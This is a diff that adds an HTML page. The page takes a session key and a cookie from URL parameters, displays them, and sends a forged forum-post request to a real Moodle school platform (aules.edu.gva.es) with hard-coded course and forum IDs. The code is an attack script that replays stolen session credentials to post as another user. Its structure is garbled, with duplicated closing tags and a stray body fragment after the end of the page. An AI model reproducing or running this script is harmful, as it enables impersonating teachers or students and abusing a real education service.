@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mostrar Variables</title>
+    <script>
+        var sesskey;
+        var cookie;
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            sesskey = params.get('sesskey');
+            cookie = params.get('cookie');
+            document.getElementById('sesskey').textContent = sesskey;
+            document.getElementById('cookie').textContent = cookie;
+        }
+
+
+
+        function makeRequest() {
+            const xhr = new XMLHttpRequest();
+            const url = 'https://aules.edu.gva.es/docent/mod/forum/post.php';
+            const params = 'discussionsubscribe=1&course=78416&forum=226583&discussion=0&parent=0&groupid=&edit=0&reply=0&sesskey='+sesskey+'&_qf__mod_forum_post_form=1&subject=Prova de guai 1 2 3&message%5Btext%5D=%3Cp+dir%3D%22ltr%22+style%3D%22text-align%3A+left%3B%22%3Eaaaaa%3Cbr%3E%3C%2Fp%3E&message%5Bformat%5D=1&message%5Bitemid%5D=507523168&submitbutton=Envia+al+f%C3%B2rum';
+
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0');
+            xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
+            xhr.setRequestHeader('Accept-Language', 'es-ES,ca;q=0.8,es;q=0.6,en-US;q=0.4,en;q=0.2');
+            xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate, br, zstd');
+            xhr.setRequestHeader('Origin', 'https://aules.edu.gva.es');
+            xhr.setRequestHeader('Connection', 'keep-alive');
+            xhr.setRequestHeader('Referer', 'https://aules.edu.gva.es/docent/mod/forum/view.php?id=3413682');
+            xhr.setRequestHeader('Cookie', cookie);
+            xhr.setRequestHeader('Upgrade-Insecure-Requests', '1');
+            xhr.setRequestHeader('Sec-Fetch-Dest', 'document');
+            xhr.setRequestHeader('Sec-Fetch-Mode', 'navigate');
+            xhr.setRequestHeader('Sec-Fetch-Site', 'same-origin');
+            xhr.setRequestHeader('Sec-Fetch-User', '?1');
+            xhr.setRequestHeader('Priority', 'u=0, i');
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log('Success:', xhr.responseText);
+                    } else {
+                        console.error('Error:', xhr.statusText);
+                    }
+                }
+            };
+
+            xhr.send(params);
+        }
+        
+    </script>
+</head>
+<body>
+    <button onclick="makeRequest()">Enviar Solicitud</button>
+</body>
+</html>
+
+    </script>
+</head>
+
+<body onload="getQueryParams()">
+    <h1>Mostrar Variables Recibidas</h1>
+    <p><strong>Sesskey:</strong> <span id="sesskey"></span></p>
+    <p><strong>Cookie:</strong> <span id="cookie"></span></p>
+    <button onclick="makeRequest()">Enviar Solicitud</button>
+</body>
+
+</html>
